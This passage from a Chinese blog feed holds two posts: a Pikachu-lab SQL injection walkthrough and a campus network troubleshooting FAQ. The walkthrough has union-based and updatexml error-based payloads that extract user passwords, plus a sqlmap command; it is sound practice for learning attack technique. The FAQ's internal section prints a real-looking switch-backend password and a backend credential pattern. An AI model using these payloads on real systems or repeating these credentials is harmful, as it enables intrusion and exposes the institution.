class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=allen         # 显示正常</span><br><span class="line">?name=allen&#x27;%23     # 显示异常</span><br><span class="line">?name=allen&quot;%23     # 显示异常</span><br><span class="line">?name=allen&#x27;)%23     # 显示正常</span><br><span class="line">?name=allen&quot;)%23     # 显示异常</span><br><span class="line"></span><br><span class="line">//可以确定该级别的闭合符号为 (&#x27;xxx&#x27;)</span><br></pre></td></tr></table></figure><p>对上题的Payload进行变形即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 猜字段数</span><br><span class="line">?name=a&#x27;) order by 2%23</span><br><span class="line"></span><br><span class="line"># 查询数据库名</span><br><span class="line">?name=1&#x27;) union select 1,database()%23</span><br><span class="line"></span><br><span class="line"># 查询表名</span><br><span class="line">?name=1&#x27;) union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()%23</span><br><span class="line"></span><br><span class="line"># 查询字段名</span><br><span class="line">?name=1&#x27;) union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;%23</span><br><span class="line"></span><br><span class="line"># 查询字段内容</span><br><span class="line">?name=1&#x27;) union select group_concat(username),group_concat(password) from users%23</span><br></pre></td></tr></table></figure><h2 id="inster注入"><a href="#inster注入" class="headerlink" title="inster注入"></a>inster注入</h2><h3 id="防御方式-21"><a href="#防御方式-21" class="headerlink" title="防御方式"></a>防御方式</h3><p>该级别对SQL注入无任何防护</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span>=<span class="string">&quot;insert into member(username,pw,sex,phonenum,email,address) values(&#x27;<span class="subst">&#123;$getdata[&#x27;username&#x27;]&#125;</span>&#x27;,md5(&#x27;<span class="subst">&#123;$getdata[&#x27;password&#x27;]&#125;</span>&#x27;),&#x27;<span class="subst">&#123;$getdata[&#x27;sex&#x27;]&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$getdata[&#x27;phonenum&#x27;]&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$getdata[&#x27;email&#x27;]&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$getdata[&#x27;add&#x27;]&#125;</span>&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure><p>相关函数<br>updatexml() 函数将xml_target中用xpath路径匹配到xml片段后应new_xml替换，返回更改后的xml</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 语法</span><br><span class="line">updatexml(xml_target,xpath,new_xml)</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> database()),<span class="number">0x7e</span>),<span class="number">1</span>);  # 查询数据库名(<span class="number">0x7e</span>为十六进制的<span class="operator">~</span>)</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">&#x27;~pikachu~&#x27;</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>);     # 查询用户名</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">&#x27;~root@192.168.132.222~&#x27;</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> updatexml(<span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">1</span>);       # 不使用concat()时查询数据不完整</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">&#x27;@192.168.132.222&#x27;</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> version()),<span class="number">0x7e</span>),<span class="number">1</span>);      # 查询数据库版本号</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">&#x27;~5.5.62-log~&#x27;</span></span><br></pre></td></tr></table></figure><p>extractValue() 函数返回xml_frag用xpath路径匹配到的xml片段</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 语法</span><br><span class="line">extractValue(xml_frag,xpath)</span><br></pre></td></tr></table></figure><p>漏洞利用<br>使用BurpSuite抓包后可以看到注册时提交的输入如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 编码前</span><br><span class="line">username=test&amp;password=123456&amp;sex=男&amp;phonenum=12312312311&amp;email=123@qq.com&amp;add=北京&amp;submit=submit</span><br><span class="line"></span><br><span class="line"># 编码后</span><br><span class="line">username=test&amp;password=123456&amp;sex=%E7%94%B7&amp;phonenum=12312312311&amp;email=123%40qq.com&amp;add=%E5%8C%97%E4%BA%AC&amp;submit=submit</span><br></pre></td></tr></table></figure><p>可以推算出注册用户时大概的SQL语句如下：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">可以推算出注册用户时大概的<span class="keyword">SQL</span>语句如下：</span><br></pre></td></tr></table></figure><p>构造如下Payload测试是否存在SQL注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=test&#x27;,&#x27;123&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;)%23&amp;password=123&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit</span><br><span class="line"></span><br><span class="line"># 返回注册成功,该处存在SQL注入</span><br><span class="line"># SQL语句如下</span><br><span class="line">insert into member(username,pw,sex,phonenum,email,address) values(&#x27;test&#x27;,&#x27;123&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;);</span><br></pre></td></tr></table></figure><p>猜数据库名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=a&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) or&#x27;</span><br><span class="line"></span><br><span class="line"># SQL语句如下</span><br><span class="line">mysql&gt; insert into member(username,pw,sex,phonenum,email,address) values(&#x27;a&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~pikachu~&#x27;</span><br></pre></td></tr></table></figure><p><img src="/CTF/31.png"><br>猜数据表名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 使用group_concat()时因数据过长所以显示不完全</span><br><span class="line">username=a&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure><p><img src="/CTF/32.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 使用limit限制查询数量，每次查询一条结果</span><br><span class="line">username=a&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure><p><img src="/CTF/33.png"><br>猜字段名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=a&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure><p>猜字段内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查询用户名</span><br><span class="line">username=a&#x27; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1) or&#x27;</span><br><span class="line"></span><br><span class="line"># 查询密码</span><br><span class="line">username=a&#x27; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure><p><img src="/CTF/34.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查询密码时最后一位显示不完全，可能是因为长度太长,将~替换为.就可以显示出来</span><br><span class="line">username=a&#x27; and updatexml(1,concat(&#x27;.&#x27;,(select password from users limit 0,1)),1) or&#x27;</span><br></pre></td></tr></table></figure><p><img src="/CTF/35.png"><br>Sqlmap Payload</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.132.200:8000/vul/sqli/sqli_iu/sqli_reg.php&quot;</span> --data=<span class="string">&quot;username=admin&amp;password=123&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit&quot;</span> -p username</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;暴力破解&quot;&gt;&lt;a href=&quot;#暴力破解&quot; class=&quot;headerlink&quot; title=&quot;暴力破解&quot;&gt;&lt;/a&gt;暴力破解&lt;/h1&gt;&lt;h2 id=&quot;基于表单的暴力破解&quot;&gt;&lt;a href=&quot;#基于表单的暴力破解&quot; class=&quot;headerlink&quot; title=</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://jielunya.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>校园网故障汇总</title>
    <link href="https://jielunya.github.io/2022/11/21/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%95%85%E9%9A%9C%E6%B1%87%E6%80%BB/"/>
    <id>https://jielunya.github.io/2022/11/21/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%95%85%E9%9A%9C%E6%B1%87%E6%80%BB/</id>
    <published>2022-11-21T12:38:19.900Z</published>
    <updated>2022-11-21T17:30:03.743Z</updated>
    
    <content type="html"><![CDATA[<h2 id="问题一：开网常见问题"><a href="#问题一：开网常见问题" class="headerlink" title="问题一：开网常见问题"></a>问题一：开网常见问题</h2><h3 id="充进去的钱可不可以退？"><a href="#充进去的钱可不可以退？" class="headerlink" title="充进去的钱可不可以退？"></a>充进去的钱可不可以退？</h3><p>答：在登录页登录后点击蓝色按钮，进入自助服务系统查看，如果余额不为零，退学离校或毕业的同学可以找信息化建设中心的老师退款，其他学生一律顺延到下个学期使用。</p><h3 id="为什么我开网之后还用不了？"><a href="#为什么我开网之后还用不了？" class="headerlink" title="为什么我开网之后还用不了？"></a>为什么我开网之后还用不了？</h3><p>答：接入校园网之后，打开登录页（10.0.0.62）登录，然后点击蓝色按钮进入自主服务系统，查看套餐一栏，如果显示未缴费，那么没有成功开网。如果显示了套餐，开网之后一般需要等待一到三个工作日才能受理成功。</p><h3 id="如何连接、使用校园网？"><a href="#如何连接、使用校园网？" class="headerlink" title="如何连接、使用校园网？"></a>如何连接、使用校园网？</h3><p>①打开WiFi，找到校园网GDIP_WEB并连接（或者电脑端可以选择插网线连接）<br>②连接成功后，在浏览器地址栏输入10.0.0.62<br>③来到登录页面，输入学号及密码即可登录成功（注意同一个账号只能在一台设备上使用）<br>1.WIFI连接：<br><img src="/image/1.png"><br><img src="/image/2.png"><br><img src="/image/3.png"><br><img src="/image/4.png"><br>2.网线连接：<br>将网线把电脑上的网口与宿舍内端口相连，重复如上操作即可。</p><h2 id="问题二：登录页面显示ldap-password-error"><a href="#问题二：登录页面显示ldap-password-error" class="headerlink" title="问题二：登录页面显示ldap password error"></a>问题二：登录页面显示ldap password error</h2><p> <img src="/image/5.png"><br>故障原因：密码输入错误。<br>解决方法：<br>1.检查并重新输入密码以重新登录。<br>2.校园网登录密码与智慧3.0登录密码同步，如近期有更改智慧3.0的登录密码，请注意输入的密码是否为新的智慧3.0的密码。<br>3.如果没有更改智慧3.0密码，也确保密码输入正确的情况下出现这样的情况，可能是网页保存的密码&#x2F;手机快捷输入密码&#x2F;学号（误改）出现了问题，请把账号密码删掉重新手动输入一遍，有必要的情况下可到智慧3.0更改密码然后再用新密码登录。<br> <br>注：智慧3.0修改密码流程如下：<br><img src="/image/6.png"></p><p> </p><h2 id="问题三：登录页面显示inuse-login-again或终端ip已在线"><a href="#问题三：登录页面显示inuse-login-again或终端ip已在线" class="headerlink" title="问题三：登录页面显示inuse ,login again或终端ip已在线"></a>问题三：登录页面显示inuse ,login again或终端ip已在线</h2><p><img src="/image/7.png"></p><p>故障原因：校园网一个账号只能提供一台终端设备进行使用，多个设备同时登录一个账号，将会把第一个设备的账号挤下线。<br>解决方法：<br>1.将第一个使用此账号的校园网注销登录，再用其他设备登录。<br>2.出现此提示后，点击返回（或者刷新页面），再次点击登录，此时会显示登陆成功（已经把其他账号挤下线）。<br>3.如果想要实现电脑和手机同时使用，可使用电脑连接校园网后开启热点供手机使用，亦可用手机连接校园网后开热点供电脑使用。</p><p> </p><h2 id="问题四：登录页面显示oppp-error等问题："><a href="#问题四：登录页面显示oppp-error等问题：" class="headerlink" title="问题四：登录页面显示oppp error等问题："></a>问题四：登录页面显示oppp error等问题：</h2><p><img src="/image/8.png"><br>故障原因：账号登录频繁或账号问题。<br>解决方法：<br>1.刷新页面再次点击登录，可多尝试几次（7次），若多次点击仍然出现，则过一段时间后再尝试。<br>2.长时间出现此提示，则可以向网络管理员提供姓名账号密码联系方式进行反馈。<br>#遇到Oppp error：password error错误的，可在自助服务系统验证密码是否错误，反之则为账号问题。 </p><h2 id="问题五：无法连接校园网，一直提示正在获取ip地址。"><a href="#问题五：无法连接校园网，一直提示正在获取ip地址。" class="headerlink" title="问题五：无法连接校园网，一直提示正在获取ip地址。"></a>问题五：无法连接校园网，一直提示正在获取ip地址。</h2><p><img src="/image/9.png"><br>故障原因：热点信号过弱；热点允许接入的主机数已达上限，新设备进入需要等待热点分配ip地址。<br>解决方法：<br>1.点击wifi设置，将网络忽略（忘记网络），再进行重新连接。<br>2.点击wifi设置，将使用随机MAC更改成使用设备MAC，或者将使用设备MAC更改为使用随机MAC。<br> <img src="/image/10.png"> </p><h2 id="问题六：登录页面显示系统繁忙。"><a href="#问题六：登录页面显示系统繁忙。" class="headerlink" title="问题六：登录页面显示系统繁忙。"></a>问题六：登录页面显示系统繁忙。</h2><p><img src="/image/11.png"><br>故障原因：校园网络使用高峰期会造成网络拥堵，导致网络卡顿、掉线、系统处理繁忙。<br>解决方法：<br>1.刷新页面，多登录几次。<br>2.尽量避开网络高峰期使用。 </p><h2 id="问题七：WIFI找不到GDIP-WEB的信号。"><a href="#问题七：WIFI找不到GDIP-WEB的信号。" class="headerlink" title="问题七：WIFI找不到GDIP_WEB的信号。"></a>问题七：WIFI找不到GDIP_WEB的信号。</h2><p>故障原因：部分区域可能没有覆盖校园网，导致搜索不到校园网信号的情况。<br>解决方法：<br>1．必要时可先用数据流量代替，等到有覆盖范围内再使用校园网。<br>2．如果确定是覆盖范围内的宿舍区找不到GDIP_WEB的信号，则可能是学校机房跳闸，需要联系网络管理员进行重新拉闸。<br>3．若是单个宿舍内没有信号，则可能是无线ap出现了问题，可以联系网络管理员或者到智慧3.0进行网络报障。</p><p> </p><h2 id="问题八：登录成功，但是没有网络。"><a href="#问题八：登录成功，但是没有网络。" class="headerlink" title="问题八：登录成功，但是没有网络。"></a>问题八：登录成功，但是没有网络。</h2><p><img src="/image/12.png"></p><p>故障原因：开通校园网需要等待1-3个工作日，到用户自助服务系统查看，如果有使用时长，但是没有已用流量（或者流量只有一点），则是没有开通成功的情况。<br>解决方法：账号开通是运营商进行处理，如果过了3个工作日依然不能使用，则可以向网络管理员上报账号进行登记处理。 </p><h2 id="问题九：连上了wifi，但是无法进入登录页面。"><a href="#问题九：连上了wifi，但是无法进入登录页面。" class="headerlink" title="问题九：连上了wifi，但是无法进入登录页面。"></a>问题九：连上了wifi，但是无法进入登录页面。</h2><p><img src="/image/13.png"><br>故障原因：登录页面没有被正确解析，导致打不开；页面被安全系统拦截。<br>解决方法：<br>1.查看ip地址是否设置了静态地址，如果是则换成自动获取ip地址（DHCP）。<br>2.手动更改DNS（改成114.114.114.114、223.6.6.6、8.8.8.8等等）<br>3.忘记GDIP_WEB网络，重新连接。<br>4.重置WIFI网络。Pc端在cmd命令中输入netsh winsock reset或者在设置中直接搜“网络重置”，然后点击立即重置；在移动端中同样有网络重置的功能来尝试重置网络。<br>5.更换一个浏览器，输入登录网址：10.0.0.62 </p><h2 id="问题十：苹果用户熄屏后自动断开校园网。"><a href="#问题十：苹果用户熄屏后自动断开校园网。" class="headerlink" title="问题十：苹果用户熄屏后自动断开校园网。"></a>问题十：苹果用户熄屏后自动断开校园网。</h2><p>故障原因：苹果系统的特殊性。<br>解决方法：<br>1.开启WIFI设置里的自动加入，将自动登录关闭，手动打开浏览器输入登陆页面网址进行登录。<br>2.将WIFI设置里的HTTP代理设置为自动。<br>3.将私有地址关闭。<br>4.关闭省电模式。<br> <img src="/image/14.png"> </p><h2 id="问题十一：登录之后，注销不了。"><a href="#问题十一：登录之后，注销不了。" class="headerlink" title="问题十一：登录之后，注销不了。"></a>问题十一：登录之后，注销不了。</h2><p><img src="/image/15.png"><br>故障原因：校园网登录状态发生变化。<br>解决方法：换个设备登录，把原来的设备登录挤掉。</p><p> </p><h2 id="问题十二：WIN10使用网线，右下角显示小地球，可以联网，但是开不了热点"><a href="#问题十二：WIN10使用网线，右下角显示小地球，可以联网，但是开不了热点" class="headerlink" title="问题十二：WIN10使用网线，右下角显示小地球，可以联网，但是开不了热点"></a>问题十二：WIN10使用网线，右下角显示小地球，可以联网，但是开不了热点</h2><p>故障原因：网络状态还没刷新。<br>解决方法：<br>1.连一下GDIP_WEB这个wifi，随后断开，即可刷新以太网状态。<br>2.拔插一下网线。<br>3.在注册表<br>[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NlaSvc\Parameters\Internet]<br>“ActiveDnsProbeHost”&#x3D;<br>“ActiveDnsProbeHostV6”&#x3D;<br>“ActiveWebProbeContent”&#x3D;<br>“ActiveWebProbeContentV6”&#x3D;<br>“ActiveWebProbeHost”&#x3D;<br>“ActiveWebProbeHostV6”&#x3D;<br>“ActiveWebProbePath”&#x3D;<br>“ActiveWebProbePathV6”&#x3D;<br>的这几个值负责开机后的网络状态检测，原来认证服务器一直是dns.msftncsi.com，微软换了其他服务器（系统更新后出的问题），这个新的服务器由于LSP和国内运营商的dns劫持等等原因的影响，造成了无法正常认证。所以把它改回原来的认证服务器就好了。<br>[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NlaSvc\Parameters\Internet]<br>“ActiveDnsProbeContent”&#x3D;”131.107.255.255”<br>“ActiveDnsProbeContentV6”&#x3D;”fd3e:4f5a:5b81::1”<br>“ActiveDnsProbeHost”&#x3D;”dns.msftncsi.com”<br>“ActiveDnsProbeHostV6”&#x3D;”dns.msftncsi.com”<br>“ActiveWebProbeContent”&#x3D;”Microsoft NCSI”<br>“ActiveWebProbeContentV6”&#x3D;”Microsoft NCSI”<br>“ActiveWebProbeHost”&#x3D;”<a href="http://www.msftncsi.com&quot;/">www.msftncsi.com&quot;</a><br>“ActiveWebProbeHostV6”&#x3D;”ipv6.msftncsi.com”<br>“ActiveWebProbePath”&#x3D;”ncsi.txt”<br>“ActiveWebProbePathV6”&#x3D;”ncsi.txt”<br>“CaptivePortalTimer”&#x3D;dword:00000000<br>“CaptivePortalTimerBackOffIncrementsInSeconds”&#x3D;dword:00000005<br>“CaptivePortalTimerMaxInSeconds”&#x3D;dword:0000001e<br>“EnableActiveProbing”&#x3D;dword:00000001<br>“PassivePollPeriod”&#x3D;dword:0000000f<br>“StaleThreshold”&#x3D;dword:0000001e<br>“WebTimeout”&#x3D;dword:00000023</p><h2 id="问题十三：-“内核接口不可用，请检查内核命令跟内核版本！”"><a href="#问题十三：-“内核接口不可用，请检查内核命令跟内核版本！”" class="headerlink" title="问题十三： “内核接口不可用，请检查内核命令跟内核版本！”"></a>问题十三： “内核接口不可用，请检查内核命令跟内核版本！”</h2><p><img src="/image/17.png"><br>解决方法：<br>1.忘记网络重新连接后，换个浏览器打开登陆页面<a href="http://10.0.0.62/">http://10.0.0.62/</a><br>2.更改mac(切换一下)；<br>3.清理下浏览器缓存之后再重新连接。<br>4.打开右下角网络连接图标，点击网络和Internet设置，找到打开页面左边的代理，关闭里面所有打开的按钮。 </p><h2 id="问题十四：电脑连上校园网之后开了热点但是手机连不到-x2F-用不了"><a href="#问题十四：电脑连上校园网之后开了热点但是手机连不到-x2F-用不了" class="headerlink" title="问题十四：电脑连上校园网之后开了热点但是手机连不到&#x2F;用不了"></a>问题十四：电脑连上校园网之后开了热点但是手机连不到&#x2F;用不了</h2><p><img src="/image/18.png"><br>解决方法：点击WiFi-网络和Internet设置-更改设配器选项-WLAN模块-属性-共享-勾选</p><p> </p><h2 id="问题十五：电脑连接校园网无法打开登陆页面。"><a href="#问题十五：电脑连接校园网无法打开登陆页面。" class="headerlink" title="问题十五：电脑连接校园网无法打开登陆页面。"></a>问题十五：电脑连接校园网无法打开登陆页面。</h2><p><img src="/image/19.png"><br>解决方法：<br>1.点击GDIP_WEB的“属性”，将随机硬件地址开启（关闭）。<br><img src="/image/20.png"><br>安卓系统：点击WiFi右边箭头，找到隐私-切换另一个MAC<br>鸿蒙系统：长按WiFi-点击“修改网络”-找到隐私-切换另一个MAC<br>2.重置网络，右击开始菜单—- “Windows PowerShell (管理员)”，输入：<br>netsh winsock reset<br>回车<br>netsh int ip reset<br>回车<br>ipconfig &#x2F;release<br>回车<br>ipconfig &#x2F;renew<br>回车<br>ipconfig &#x2F;flushdns<br>回车<br>ipconfig &#x2F;registerdns<br>回车<br>然后右击开始菜单—运行，输入<br>inetcpl.cpl<br>回车<br>—–高级，还原一下高级设置。<br>然后任务栏搜索框输入<br>Internet<br>回车<br>打开Internet选项—高级—使用TLS1.0 使用TLS1.1 使用TLS1.2 使用TLS1.3（实验） 这4个打上勾。<br>执行完毕上述方案后，重启设备。<br>然后重置一下Edge：<br>浏览器右上角3个点，设置，重置设置，还原其默认值。</p><h2 id="问题十六：电脑连上校园网之后开了热点但是手机连不到-x2F-用不了"><a href="#问题十六：电脑连上校园网之后开了热点但是手机连不到-x2F-用不了" class="headerlink" title="问题十六：电脑连上校园网之后开了热点但是手机连不到&#x2F;用不了"></a>问题十六：电脑连上校园网之后开了热点但是手机连不到&#x2F;用不了</h2><p>解决方法：点击WiFi-网络和Internet设置-更改设配器选项-WLAN模块-属性-共享-勾选<br><img src="/image/22.png"></p><h2 id="问题十七：电脑连接校园网无法打开登陆页面。"><a href="#问题十七：电脑连接校园网无法打开登陆页面。" class="headerlink" title="问题十七：电脑连接校园网无法打开登陆页面。"></a>问题十七：电脑连接校园网无法打开登陆页面。</h2><p><img src="/image/25.png"></p><p>解决方法：</p><ol><li>点击GDIP_WEB的“属性”，将随机硬件地址开启（关闭）。<br> <img src="/image/26.png"><br>安卓系统：点击WiFi右边箭头，找到隐私-切换另一个MAC<br>鸿蒙系统：长按WiFi-点击“修改网络”-找到隐私-切换另一个MAC</li><li>重置网络，右击开始菜单—- “Windows PowerShell (管理员)”，输入：<br>netsh winsock reset<br>回车<br>netsh int ip reset<br>回车<br>ipconfig &#x2F;release<br>回车<br>ipconfig &#x2F;renew<br>回车<br>ipconfig &#x2F;flushdns<br>回车<br>ipconfig &#x2F;registerdns<br>回车<br>然后右击开始菜单—运行，输入<br>inetcpl.cpl<br>回车<br>—–高级，还原一下高级设置。<br>然后任务栏搜索框输入<br>Internet<br>回车<br>打开Internet选项—高级—使用TLS1.0 使用TLS1.1 使用TLS1.2 使用TLS1.3（实验） 这4个打上勾。<br>执行完毕上述方案后，重启设备。<br>然后重置一下Edge：<br>浏览器右上角3个点，设置，重置设置，还原其默认值。</li><li>如果如下图所示登录页面提示，可以考虑是不是开了代理，是的话关掉即可。<br><img src="/image/27.png"><br><img src="/image/28.png"></li></ol><h2 id="问题十八：校园网经常卡怎么办"><a href="#问题十八：校园网经常卡怎么办" class="headerlink" title="问题十八：校园网经常卡怎么办"></a>问题十八：校园网经常卡怎么办</h2><p><img src="/image/29.png"><br>首先，可以先自己排查一下，比如可以自己测试一下网速是否达标；借用同学的校园网账号在自己的设备上登陆查看是否有问题；尝试将网线插到其他端口上；如果发现网络卡是账号或者是端口问题，可以在网上进行保修，服务网址：网络故障登记 (gdqy.edu.cn)<br>正常网速：</p><p>正常登陆：<br><img src="/image/30.png"></p><p>网速慢的相关内容<br>👉🏻在教室上课的时候，很多同学同时连接一个接入点ap，共享这个ap无线信号提供的非常有限带宽;加上上课期间课室网上设备多，这个时候校园网慢是正常的。<br>👉🏻在一定区域范围内，使用某个运营商上网的人太多了，网速自然会慢。而在校园网发生大规模故障的时候，会有更多的学生转用数据上网，从而加剧了这个问题。</p><h2 id="问题十九：校园网的时间纠正"><a href="#问题十九：校园网的时间纠正" class="headerlink" title="问题十九：校园网的时间纠正"></a>问题十九：校园网的时间纠正</h2><p>时间出错解决办法：<br>在连接校园网前把自动同步网络时间和网络时区的功能都给关闭。<br>如果时间已经错了，首先断开校园网用数据连接，然后关闭自动同步时间时区，重启设备，再重新打开自动同步，时间正确后关闭自动同步。</p><h2 id="问题二十：在宿舍突然搜索不到WiFi信号了。"><a href="#问题二十：在宿舍突然搜索不到WiFi信号了。" class="headerlink" title="问题二十：在宿舍突然搜索不到WiFi信号了。"></a>问题二十：在宿舍突然搜索不到WiFi信号了。</h2><p>重启自己的手机试试看，如果重启后还是无效，并且询问周围同学也是无法搜索到WiFi信号的话（或者很弱，只有一两格WiFi信号），请到QQ故障群反馈，后续会有相关人员前去查看的。</p><h2 id="问题二十一：校园网连续性中断，但重新登陆正常"><a href="#问题二十一：校园网连续性中断，但重新登陆正常" class="headerlink" title="问题二十一：校园网连续性中断，但重新登陆正常"></a>问题二十一：校园网连续性中断，但重新登陆正常</h2><p>可能是账号冲突，检查一下是不是其他人登陆了自己的账号导致账号冲突。或者修改密码重新登陆。</p><h2 id="问题二十二：在教室连不上校园网"><a href="#问题二十二：在教室连不上校园网" class="headerlink" title="问题二十二：在教室连不上校园网"></a>问题二十二：在教室连不上校园网</h2><p>👉🏻如果把一栋楼的网络系统比喻成一间饭店。这个系统里面ip池的ip数量相当于饭店里面的座位数。<br>👉🏻当你去饭店发现人坐满了你就不能坐进去。<br>当你连WiFi的时候，ip用完了你也就连不上了。<br>⚠️获取不了ip在教学楼比较常见<br>👉🏻解决办法是早早去到教室早早连上WiFi，课间不要把手机带出课室（带出课室后可能会断开，断开就可能回去就连不上了）</p><h2 id="问题二十三：南区无线网络覆盖范围（2022-4-1-）"><a href="#问题二十三：南区无线网络覆盖范围（2022-4-1-）" class="headerlink" title="问题二十三：南区无线网络覆盖范围（2022.4.1.）"></a>问题二十三：南区无线网络覆盖范围（2022.4.1.）</h2><p>1号楼办公楼1楼部分区域<br>2号楼全部课室<br>6号楼一楼图书馆<br>7号楼食堂1、2楼<br>8号楼教师公寓以及一楼医务室附近<br>9、10、11、12全部学生宿舍<br>北区除了校道、操场、图书馆四五楼、一饭食堂高层区、二饭，其他地方基本覆盖</p><h2 id="问题二十四-电脑WLAN图标不见了"><a href="#问题二十四-电脑WLAN图标不见了" class="headerlink" title="问题二十四 电脑WLAN图标不见了"></a>问题二十四 电脑WLAN图标不见了</h2><p><img src="/image/31.png"><br>故障原因：系统的某项服务被关闭。<br>解决方法：win+R后输入：services.msc 点击确定（或按回车键）打开服务。<br>找到：WLAN AutoConfig（无线服务）→启动类型→自动→应用→启动→确定<br><img src="/image/32.png"><br><img src="/image/33.png"><br><img src="/image/34.png"></p><h2 id="部门内部常用"><a href="#部门内部常用" class="headerlink" title="部门内部常用"></a>部门内部常用</h2><h3 id="一、-相关网站"><a href="#一、-相关网站" class="headerlink" title="一、  相关网站"></a>一、  相关网站</h3><p>（一）自助服务系统：用户自助服务系统<br>备注：<br>1、可以通过点击登录页的蓝色按钮进入。<br>2、在实训楼机房电脑查用户缴费信息，只能直接打开该网址。<br><img src="/image/35.png"><br><img src="/image/36.png"></p><p>（二）交换机后台：<a href="http://what.gdqy.edu.cn/">http://what.gdqy.edu.cn/</a><br>备注：账号guest，密码Nic88576120。绿色正常，红色挂机。<br><img src="/image/37.png"></p><p>（三）报障后台：<a href="http://bz.gdqy.edu.cn/net.jsp">http://bz.gdqy.edu.cn/net.jsp</a><br>备注：账号密码都是nic+楼栋数，例如十三十四栋账号和密码都是nic1314<br><img src="/image/38.png"></p><h3 id="二、网络故障排除"><a href="#二、网络故障排除" class="headerlink" title="二、网络故障排除"></a>二、网络故障排除</h3><p>通过控制变量找出问题的具体文章，在进行处理</p><ol><li>如果出现规模性的网络故障，例如无法获取ip地址，或者大批账号出现oppp错误，那么及时反映、并按照最新通知处理。例如oppp错误的可能会收集一些问题账号测试，但是有的时候不用。</li><li>如果非规模性故障，可以先确定是账号问题还是设备问题。例如上不了知乎，可以问问用户是不是电脑和手机都有同样的问题。必要时向用户索要账号密码，测试，如果自己的账号在一同电脑上没有问题，但是用户的登录用户的账号会出现问题，那么就是账号问题，反之是设备问题。#如果用户的账号没有问题，但是用户手机电脑都不能上网，可能是机房交换机不正常工作（这种情况下他身边的人也用不了），可能是他的手机和电脑同时分别出现了故障，或者他违规使用路由器。</li><li>如果确定是设备问题的话再针对具体表现进行处理。</li></ol><h3 id="三、登录及相关故障"><a href="#三、登录及相关故障" class="headerlink" title="三、登录及相关故障"></a>三、登录及相关故障</h3><p>（一）登录页报错(如oppp error问题)<br>1、可以提醒用户暂时先别登录了，等15分钟左右之后再试试。<br>2、如果15分钟左右之后还是出现同样的错误提示，那么收集姓名（判断是否填错） 、电话（极少会用到） 、账号、密码、运营商转发给对应的运营商临时负责人。<br>#移动上报至软件212张涛师兄，电信上报至计算机212诸定航师兄。<br>#如果最近出现了大规模的网络故障，则按通知确定是否收集账号。<br>#该处理办法不包括密码错误。<br>#遇到Oppp error：password 